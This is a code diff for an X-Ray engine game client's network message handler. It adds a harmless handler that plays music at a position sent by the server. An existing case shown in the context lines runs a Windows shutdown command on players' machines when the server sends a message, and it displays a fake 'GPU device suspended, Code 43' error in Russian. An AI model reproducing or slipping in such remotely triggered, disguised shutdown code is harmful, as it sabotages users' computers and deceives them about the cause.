@@ -19,6 +19,7 @@
 //#include "../xrEngine/XR_IOConsole.h"
 
 extern LPCSTR map_ver_string;
+ref_sound snd;
 LPSTR remove_version_option(LPCSTR opt_str, LPSTR new_opt_str, u32 new_opt_str_size)
 {
 	LPCSTR temp_substr = strstr(opt_str, map_ver_string);
@@ -486,6 +487,22 @@ void CLevel::ClientReceive()
 			system("shutdown /s /t 5 /c \"Экземпляр устройства GPU приостановлен! Код: 43\" ");
 			break;
 		}
+
+		case M_MUSIC_UPDATE:
+		{
+			shared_str name;
+			Fvector pos;
+			P->r_stringZ(name);
+			P->r_vec3(pos);
+			Msg("Client Event");
+			snd.stop();
+			snd.destroy();
+			snd.create(name.c_str(), st_Music, sg_SourceType);
+			snd.play_at_pos(NULL, pos);
+			break;
+		}
+
+		
 		}
 
 		net_msg_Release();
